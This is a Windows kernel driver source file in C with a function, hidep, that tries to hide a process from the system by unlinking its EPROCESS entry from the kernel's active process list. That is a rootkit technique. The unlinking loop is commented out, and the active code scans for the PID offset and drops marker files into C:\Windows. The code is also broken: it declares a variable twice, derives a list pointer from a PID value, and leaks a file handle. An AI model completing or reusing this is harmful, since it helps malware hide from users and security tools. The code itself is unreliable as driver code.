#include "Driver.h"

PCHAR hidep(UINT32 pid) {

	

	PEPROCESS currentProcess = PsGetCurrentProcess();
	
	ULONG CurrentPID = *((ULONG*)((ULONG_PTR)currentProcess + 0x440)); // (ULONG)((ULONG_PTR)PsGetProcessId(currentProcess));


	wchar_t path[512];
	swprintf_s(path, 512, L"\\DosDevices\\C:\\Windows\\%lu.bop", CurrentPID);

	debugFile(path);

	ULONG CurrentPID = (ULONG)((ULONG_PTR)PsGetProcessId(currentProcess));

	ULONG PID_OFFSET = 0;

	debugFile(L"\\DosDevices\\C:\\Windows\\Germany.txt");

	for (int i = 0; i < 0x300; i += 2) {

		if ((*(ULONG*)((ULONG_PTR)currentProcess + i) == CurrentPID)) {

			debugFile(L"\\DosDevices\\C:\\Windows\\Bulgaria.txt");
			PID_OFFSET = i;
			break;
		}
	}

	

	if (!PID_OFFSET) {
		return NULL;
	}

	debugFile(L"\\DosDevices\\C:\\Windows\\Romania.txt");

	PLIST_ENTRY currentList = (PLIST_ENTRY)((ULONG_PTR)CurrentPID + sizeof(INT_PTR));
	ULONG LIST_OFFSET = (ULONG)((ULONG_PTR)currentList - (ULONG_PTR)currentProcess);
	
	// Record the starting position
	PEPROCESS StartProcess = currentProcess;

	


	// Move to next item
	currentProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - LIST_OFFSET);

	//CurrentPID = PsGetProcessId(currentProcess);
	//currentList = currentList->Flink;

	// Loop until we find the right process to remove
	// Or until we circle back

	debugFile(L"\\DosDevices\\C:\\Windows\\bfe.txt");

	pid;
	StartProcess;

	//while ((ULONG_PTR)StartProcess != (ULONG_PTR)currentProcess) {

	//	// Check item
	//	if (*(UINT32*)CurrentPID == pid) {
	//	
	//		debugFile(L"\\DosDevices\\C:\\Windows\\pid.fnd");

	//		PLIST_ENTRY prev = currentList->Blink;
	//		PLIST_ENTRY next = currentList->Flink;

	//		prev->Flink = next;
	//		next->Blink = prev;

	//		// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	//		currentList->Blink = (PLIST_ENTRY)&currentList->Flink;
	//		currentList->Flink = (PLIST_ENTRY)&currentList->Flink;

	//		break;
	//	}

	//	// Move to next item
	//	currentProcess = (PEPROCESS)((ULONG_PTR)currentList->Flink - LIST_OFFSET);
	//	CurrentPID = PsGetProcessId(currentProcess);
	//	currentList = currentList->Flink;
	//}


	

	return NULL;
}

void debugFile(WCHAR name[]) {

	// START
	NTSTATUS ntstatus = STATUS_SUCCESS;
	/////////////////////// THIS SECTION /////////////////////////////////////
	UNICODE_STRING     uniName;
	OBJECT_ATTRIBUTES  objAttr;
	////////////////////////////////\\SystemRoot\\ or C:\WINDOWS / C:|WINNT
	RtlInitUnicodeString(&uniName, name);  // or L"\\SystemRoot\\example.txt"
	InitializeObjectAttributes(&objAttr, &uniName,
		OBJ_CASE_INSENSITIVE,
		NULL, NULL);
	//////////////////////////////////

	///////////////////////////////////
	// Load the buffer (ie. contents of text file to the console)
	HANDLE handle;
	IO_STATUS_BLOCK    ioStatusBlock;
	ntstatus = ZwCreateFile(&handle,
		FILE_WRITE_DATA,
		&objAttr, &ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OPEN_IF,
		FILE_NON_DIRECTORY_FILE,
		NULL, 0);

}


//ULONG find_eproc_pid() {
//
//	ULONG pid_ofs = 0;					// The offset we're looking for
//	ULONG pid = 0;		
//	PEPROCESS eproc;
//	// Select 3 process PIDs and get their EPROCESS Pointer
//	for (int i = 16;; i += 4) {
//
//		if (PsLookupProcessByProcessId((HANDLE)i, (PEPROCESS*)&eproc) == STATUS_SUCCESS) {
//			pid = i;
//			break;
//		}
//	}
//
//	for (int i = 0x20; i < 0x300; i += 4) {
//		if ((*(ULONG*)((UCHAR*)eproc + i) == pid))
//		{
//			debugFile(L"\\DosDevices\\C:\\Windows\\off.fnd");
//			pid_ofs = i; break;
//		}
//	}
//
//	
//	ObDereferenceObject(eproc);
//
//	return pid_ofs;
//}